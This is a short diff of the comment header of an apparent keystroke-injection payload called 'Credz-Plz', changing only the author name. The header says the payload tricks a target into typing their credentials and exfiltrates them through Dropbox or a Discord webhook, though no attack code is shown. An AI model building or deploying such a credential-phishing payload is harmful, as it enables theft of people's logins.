@@ -1,6 +1,6 @@
 REM     Title: Credz-Plz
 
-REM     Author: I am Jakoby
+REM     Author:mrflippermen
 
 REM     Description: This payload prompts the target to enter their creds to later be exfiltrated with either Dropbox or a  Discord webhook.
 
